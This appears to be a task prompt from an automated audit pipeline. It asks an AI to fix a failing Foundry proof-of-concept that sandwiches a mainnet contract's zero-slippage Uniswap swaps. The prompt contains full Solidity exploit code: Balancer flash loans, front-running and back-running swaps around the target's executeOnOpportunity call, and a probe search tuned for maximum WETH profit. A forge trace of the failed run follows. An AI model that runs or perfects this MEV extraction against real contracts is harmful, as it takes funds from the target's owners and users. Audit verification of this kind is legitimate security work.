You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Zero-minimum-output swaps let MEV searchers siphon away most of the extracted value
- claim: Both Uniswap V2 swap calls use `amountOutMin = 0`, so the verifier accepts any execution price for both the seed ETH-to-AAVE buy and the final AAVE-to-ETH liquidation.
- impact: A searcher can sandwich the transaction, push the AAVE/WETH price sharply against the verifier for each leg, and capture most of the exploitable value while still allowing the transaction to satisfy the minimal profit check.
- exploit_paths: ["Observe `executeOnOpportunity()` in the public mempool", "Front-run to worsen the AAVE/WETH price before one or both swaps", "Let the verifier swap with `amountOutMin = 0` at the manipulated price", "Back-run to restore price and keep the spread"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function factory() external view returns (address);

    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
    function executeOnOpportunity() external;
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    uint256 private constant BPS = 10_000;
    uint256 private constant MIN_REQUIRED_PROFIT = 0.1 ether;

    struct SearchState {
        Strategy bestStrategy;
        uint256 bestAmount;
        uint256 bestProfit;
        uint256 lastSuccessfulAmount;
        uint256 firstFailedAmount;
        uint256 previousAmount;
    }

    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;

    error ProbeResult(uint8 strategyRaw, uint256 amount, uint256 profit);

    enum Strategy {
        None,
        DumpAaveBeforeTargetSell,
        PumpAaveBeforeTargetBuy
    }

    bool public executed;
    bool public targetCallSucceeded;
    bool public hypothesisValidated;
    bool public pairDiscovered;

    address public immutable aaveToken;
    address public immutable pair;

    address private activeLoanToken;
    uint256 private activeLoanAmount;
    Strategy private activeStrategy;

    uint256 private realizedProfitAmount;
    string private realizedPath;

    string private constant INFEASIBLE_PATH =
        "Observe executeOnOpportunity() in the public mempool -> front-run to worsen the AAVE/WETH price before one or both swaps -> let the verifier attempt its amountOutMin = 0 swap at the manipulated price -> back-run to restore price and keep the spread (infeasible on this fork only if every realistic sandwich size either reverts the target or stays below the minimum-profit bar)";

    string private constant SELL_LEG_PATH =
        "Observe executeOnOpportunity() in the public mempool -> front-run to worsen the AAVE/WETH price before the verifier's final AAVE/WETH liquidation -> let the verifier execute its amountOutMin = 0 swap at the manipulated price -> back-run to restore price and keep the spread";

    string private constant BUY_LEG_PATH =
        "Observe executeOnOpportunity() in the public mempool -> front-run to worsen the AAVE/WETH price before the verifier's seed WETH/AAVE buy -> let the verifier execute its amountOutMin = 0 swap at the manipulated price -> back-run to restore price and keep the spread";

    constructor() {
        address discoveredAave = _safeReadAave();
        aaveToken = discoveredAave == address(0) ? DEFAULT_AAVE : discoveredAave;
        pair = _safeDiscoverPair(aaveToken, WETH);
        pairDiscovered = pair != address(0);
    }

    function executeOnOpportunity() external {
        if (executed || realizedProfitAmount > 0) {
            return;
        }
        executed = true;

        if (pair == address(0)) {
            realizedPath = INFEASIBLE_PATH;
            return;
        }

        (uint256 reserveAave, uint256 reserveWeth) = _pairReserves();
        uint256 vaultAave = IERC20(aaveToken).balanceOf(BALANCER_VAULT);
        uint256 vaultWeth = IERC20(WETH).balanceOf(BALANCER_VAULT);

        (Strategy bestStrategy, uint256 bestAmount, uint256 bestProfit) = _findBestAttempt(
            reserveAave,
            reserveWeth,
            vaultAave,
            vaultWeth
        );

        if (bestStrategy == Strategy.None) {
            realizedPath = INFEASIBLE_PATH;
            return;
        }

        this._execute(uint8(bestStrategy), bestAmount);

        if (bestProfit >= MIN_REQUIRED_PROFIT) {
            hypothesisValidated = true;
        }
    }

    function _probe(uint8 strategyRaw, uint256 amount) external {
        require(msg.sender == address(this), "self only");
        uint256 profit = _runAttempt(Strategy(strategyRaw), amount);
        revert ProbeResult(strategyRaw, amount, profit);
    }

    function _execute(uint8 strategyRaw, uint256 amount) external {
        require(msg.sender == address(this), "self only");
        Strategy strategy = Strategy(strategyRaw);
        uint256 profit = _runAttempt(strategy, amount);

        realizedProfitAmount = profit;
        realizedPath = strategy == Strategy.DumpAaveBeforeTargetSell ? SELL_LEG_PATH : BUY_LEG_PATH;
        hypothesisValidated = profit >= MIN_REQUIRED_PROFIT;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "vault only");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "single loan only");
        require(tokens[0] == activeLoanToken && amounts[0] == activeLoanAmount, "loan mismatch");

        if (activeStrategy == Strategy.DumpAaveBeforeTargetSell) {
            _forceApprove(aaveToken, UNISWAP_V2_ROUTER, amounts[0]);
            _swapExact(aaveToken, WETH, amounts[0]);
        } else if (activeStrategy == Strategy.PumpAaveBeforeTargetBuy) {
            _forceApprove(WETH, UNISWAP_V2_ROUTER, amounts[0]);
            _swapExact(WETH, aaveToken, amounts[0]);
        } else {
            revert("invalid strategy");
        }

        // Core exploit causality from the finding: first move the pool against the victim,
        // then let the victim keep its amountOutMin = 0 swap(s), then restore the pool and
        // keep the spread. The flash loan is only the realistic public funding leg.
        IAaveBoostTarget(TARGET).executeOnOpportunity();
        targetCallSucceeded = true;

        if (activeStrategy == Strategy.DumpAaveBeforeTargetSell) {
            uint256 neededAave = amounts[0] + feeAmounts[0];
            uint256 currentAave = IERC20(aaveToken).balanceOf(address(this));
            if (currentAave < neededAave) {
                uint256 missingAave = neededAave - currentAave;
                uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
                _forceApprove(WETH, UNISWAP_V2_ROUTER, wethBalance);

                // Realistic searcher unwind: after the victim sells AAVE at a manipulated,
                // amountOutMin = 0 price, buy back only the exact flash-loan principal needed
                // for repayment and keep the residual WETH as the extracted sandwich spread.
                _swapForExact(WETH, aaveToken, missingAave, wethBalance);
                currentAave = IERC20(aaveToken).balanceOf(address(this));
            }
            require(currentAave >= neededAave, "insufficient AAVE to repay flashloan");
            require(IERC20(aaveToken).transfer(BALANCER_VAULT, neededAave), "AAVE repay failed");
        } else {
            uint256 currentAave = IERC20(aaveToken).balanceOf(address(this));
            if (currentAave > 0) {
                _forceApprove(aaveToken, UNISWAP_V2_ROUTER, currentAave);
                _swapExact(aaveToken, WETH, currentAave);
            }
            uint256 neededWeth = amounts[0] + feeAmounts[0];
            uint256 currentWeth = IERC20(WETH).balanceOf(address(this));
            require(currentWeth >= neededWeth, "insufficient WETH to repay flashloan");
            require(IERC20(WETH).transfer(BALANCER_VAULT, neededWeth), "WETH repay failed");
        }

        activeLoanToken = address(0);
        activeLoanAmount = 0;
        activeStrategy = Strategy.None;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external view returns (string memory) {
        if (bytes(realizedPath).length != 0) {
            return realizedPath;
        }
        return pair == address(0) ? INFEASIBLE_PATH : SELL_LEG_PATH;
    }

    function _findBestAttempt(
        uint256 reserveAave,
        uint256 reserveWeth,
        uint256 vaultAave,
        uint256 vaultWeth
    ) internal returns (Strategy bestStrategy, uint256 bestAmount, uint256 bestProfit) {
        (bestStrategy, bestAmount, bestProfit) = _searchStrategy(
            Strategy.DumpAaveBeforeTargetSell,
            reserveAave,
            (vaultAave * 95) / 100
        );

        (Strategy altStrategy, uint256 altAmount, uint256 altProfit) = _searchStrategy(
            Strategy.PumpAaveBeforeTargetBuy,
            reserveWeth,
            (vaultWeth * 95) / 100
        );

        if (altProfit > bestProfit) {
            bestStrategy = altStrategy;
            bestAmount = altAmount;
            bestProfit = altProfit;
        }
    }

    function _searchStrategy(
        Strategy strategy,
        uint256 reserveBase,
        uint256 vaultCap
    ) internal returns (Strategy bestStrategy, uint256 bestAmount, uint256 bestProfit) {
        SearchState memory state;

        for (uint256 i = 0; i < 39; ++i) {
            uint256 amount = _capAmount((reserveBase * _coarseBps(i)) / BPS, vaultCap);
            if (amount == 0 || amount == state.previousAmount) {
                continue;
            }
            state.previousAmount = amount;
            state = _recordProbe(state, strategy, amount);
        }

        if (state.lastSuccessfulAmount == 0) {
            return (Strategy.None, 0, 0);
        }

        uint256 high = state.firstFailedAmount == 0
            ? (vaultCap > state.lastSuccessfulAmount ? vaultCap : state.lastSuccessfulAmount)
            : state.firstFailedAmount;
        state = _binaryRefine(state, strategy, state.lastSuccessfulAmount, high);
        state = _windowRefine(state, strategy, high);

        return (state.bestStrategy, state.bestAmount, state.bestProfit);
    }

    function _recordProbe(
        SearchState memory state,
        Strategy strategy,
        uint256 amount
    ) internal returns (SearchState memory) {
        (bool ok, uint256 profit) = _simulate(strategy, amount);
        if (ok) {
            state.lastSuccessfulAmount = amount;
            if (profit > state.bestProfit) {
                state.bestProfit = profit;
                state.bestAmount = amount;
                state.bestStrategy = strategy;
            }
        } else if (state.lastSuccessfulAmount != 0 && state.firstFailedAmount == 0) {
            state.firstFailedAmount = amount;
        }
        return state;
    }

    function _binaryRefine(
        SearchState memory state,
        Strategy strategy,
        uint256 low,
        uint256 high
    ) internal returns (SearchState memory) {
        for (uint256 i = 0; i < 18; ++i) {
            if (high <= low + 1) {
                break;
            }
            uint256 mid = low + ((high - low) / 2);
            (bool ok, uint256 profit) = _simulate(strategy, mid);
            if (ok) {
                low = mid;
                if (profit > state.bestProfit) {
                    state.bestProfit = profit;
                    state.bestAmount = mid;
                    state.bestStrategy = strategy;
                }
            } else {
                high = mid;
            }
        }
        return state;
    }

    function _windowRefine(
        SearchState memory state,
        Strategy strategy,
        uint256 high
    ) internal returns (SearchState memory) {
        uint256 windowStart = state.bestAmount > (state.bestAmount / 10) ? state.bestAmount - (state.bestAmount / 10) : 1;
        uint256 windowEnd = high > state.bestAmount ? high : state.bestAmount;
        if (windowEnd < windowStart) {
            windowEnd = windowStart;
        }

        for (uint256 i = 0; i < 10; ++i) {
            uint256 probe = windowStart + ((windowEnd - windowStart) * i) / 9;
            if (probe == 0) {
                continue;
            }
            (bool ok, uint256 profit) = _simulate(strategy, probe);
            if (ok && profit > state.bestProfit) {
                state.bestProfit = profit;
                state.bestAmount = probe;
                state.bestStrategy = strategy;
            }
        }
        return state;
    }

    function _simulate(Strategy strategy, uint256 amount) internal returns (bool ok, uint256 profit) {
        try this._probe(uint8(strategy), amount) {
            return (false, 0);
        } catch (bytes memory reason) {
            return _decodeProbeResult(reason);
        }
    }

    function _decodeProbeResult(bytes memory reason) internal pure returns (bool ok, uint256 profit) {
        if (reason.length != 100) {
            return (false, 0);
        }

        bytes4 selector;
        uint256 decodedProfit;
        assembly {
            selector := mload(add(reason, 32))
            decodedProfit := mload(add(reason, 100))
        }

        if (selector != ProbeResult.selector) {
            return (false, 0);
        }

        return (true, decodedProfit);
    }

    function _coarseBps(uint256 index) internal pure returns (uint256) {
        if (index == 0) return 1;
        if (index == 1) return 2;
        if (index == 2) return 3;
        if (index == 3) return 5;
        if (index == 4) return 8;
        if (index == 5) return 10;
        if (index == 6) return 12;
        if (index == 7) return 15;
        if (index == 8) return 20;
        if (index == 9) return 25;
        if (index == 10) return 30;
        if (index == 11) return 40;
        if (index == 12) return 50;
        if (index == 13) return 75;
        if (index == 14) return 100;
        if (index == 15) return 125;
        if (index == 16) return 150;
        if (index == 17) return 175;
        if (index == 18) return 200;
        if (index == 19) return 250;
        if (index == 20) return 300;
        if (index == 21) return 350;
        if (index == 22) return 400;
        if (index == 23) return 500;
        if (index == 24) return 600;
        if (index == 25) return 750;
        if (index == 26) return 900;
        if (index == 27) return 1000;
        if (index == 28) return 1250;
        if (index == 29) return 1500;
        if (index == 30) return 1750;
        if (index == 31) return 2000;
        if (index == 32) return 2250;
        if (index == 33) return 2500;
        if (index == 34) return 3000;
        if (index == 35) return 3500;
        if (index == 36) return 4000;
        if (index == 37) return 4500;
        return 5000;
    }

    function _runAttempt(Strategy strategy, uint256 amount) internal returns (uint256 profit) {
        require(amount > 0, "zero amount");

        address loanToken = strategy == Strategy.DumpAaveBeforeTargetSell ? aaveToken : WETH;
        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        activeLoanToken = loanToken;
        activeLoanAmount = amount;
        activeStrategy = strategy;
        targetCallSucceeded = false;

        address[] memory tokens = new address[](1);
        tokens[0] = loanToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(strategy));

        uint256 wethAfter = IERC20(WETH).balanceOf(address(this));
        if (wethAfter > wethBefore) {
            profit = wethAfter - wethBefore;
        }
    }

    function _swapExact(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _swapForExact(address tokenIn, address tokenOut, uint256 amountOut, uint256 amountInMax) internal {
        if (amountOut == 0) return;
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint256[] memory quoted = IUniswapV2Router(UNISWAP_V2_ROUTER).getAmountsIn(amountOut, path);
        uint256 spendCap = quoted[0];
        require(spendCap <= amountInMax, "insufficient input for exact swap");

        IUniswapV2Router(UNISWAP_V2_ROUTER).swapTokensForExactTokens(
            amountOut,
            spendCap,
            path,
            address(this),
            block.timestamp
        );
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok0;
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _pairReserves() internal view returns (uint256 reserveAave, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == aaveToken) {
            reserveAave = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveAave = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _safeReadAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeDiscoverPair(address tokenA, address tokenB) internal view returns (address discoveredPair) {
        (bool okFactory, bytes memory factoryData) = UNISWAP_V2_ROUTER.staticcall(
            abi.encodeWithSelector(IUniswapV2Router.factory.selector)
        );
        if (!okFactory || factoryData.length < 32) {
            return address(0);
        }

        address factory = abi.decode(factoryData, (address));
        (bool okPair, bytes memory pairData) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (okPair && pairData.length >= 32) {
            discoveredPair = abi.decode(pairData, (address));
        }
    }

    function _capAmount(uint256 targetAmount, uint256 hardCap) internal pure returns (uint256) {
        if (targetAmount == 0 || hardCap == 0) return 0;
        return targetAmount < hardCap ? targetAmount : hardCap;
    }
}

```

forge stdout (tail):
```
567Ada9b2E0CAE044f, 15299179021713756637 [1.529e19])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000dfc14d2af169b0d36c4eff567ada9b2e0cae044f
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000d4519a43005b51dd
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [64482] 0xDFC14d2Af169B0D36C4EFF567Ada9b2E0CAE044f::swap(93871232420053695039 [9.387e19], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   │   │   │   ├─ [33252] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 93871232420053695039 [9.387e19])
    │   │   │   │   │   │   │   ├─ [32482] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 93871232420053695039 [9.387e19]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000dfc14d2af169b0d36c4eff567ada9b2e0cae044f
    │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000516b99c88f16eba3f
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0xDFC14d2Af169B0D36C4EFF567Ada9b2E0CAE044f) [staticcall]
    │   │   │   │   │   │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0xDFC14d2Af169B0D36C4EFF567Ada9b2E0CAE044f) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 188307387001110722245 [1.883e20]
    │   │   │   │   │   │   │   └─ ← [Return] 188307387001110722245 [1.883e20]
    │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xDFC14d2Af169B0D36C4EFF567Ada9b2E0CAE044f) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 45897537065141269911 [4.589e19]
    │   │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000a354a3ac83f36f6c50000000000000000000000000000000000000000000000027cf4cec90111f597
    │   │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d4519a43005b51dd00000000000000000000000000000000000000000000000516b99c88f16eba3f0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] [15299179021713756637 [1.529e19], 93871232420053695039 [9.387e19]]
    │   │   │   │   ├─ [193] 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA::executeOnOpportunity()
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Stop]
    ├─ [296] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [392] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22685443 [2.268e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA.executeOnOpportunity
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier._probe
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 201.16ms (66.58ms CPU time)

Ran 1 test suite in 246.48ms (201.16ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 17550590)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
